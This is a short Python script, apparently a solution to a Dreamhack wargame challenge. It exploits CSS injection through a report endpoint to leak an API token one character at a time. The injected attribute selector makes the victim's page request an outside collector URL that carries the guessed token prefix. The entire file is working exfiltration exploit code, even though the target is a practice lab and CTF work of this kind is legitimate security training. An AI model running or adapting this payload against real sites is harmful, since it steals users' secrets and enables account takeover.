import requests
from urllib import parse
apitoken = "plnmdhad"
url = "http://host3.dreamhack.games:8676/report"
for ch in range(97,123):
    ch = chr(ch)
    payload = "mypage?color=white; } input[id=InputApitoken][value^=%s] { background: url(https://jhgiwgt.request.dreamhack.games?data=%s)" % (apitoken+ch,apitoken+ch)
    request = requests.post(url,data={"path": payload})
    print(parse.unquote(request.url))
    print(request.status_code)
